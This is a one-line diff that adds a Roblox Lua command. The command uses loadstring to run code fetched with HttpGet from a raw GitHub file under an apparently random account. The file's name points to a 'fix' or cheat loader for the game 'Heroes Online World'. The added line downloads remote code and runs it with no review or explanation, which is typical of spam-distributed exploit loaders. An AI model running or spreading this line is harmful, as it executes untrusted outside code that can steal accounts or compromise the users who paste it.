@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/dynamic-fix-heroes-online-world-spam5-ppeyo8ocm5a2fv.lua"))()
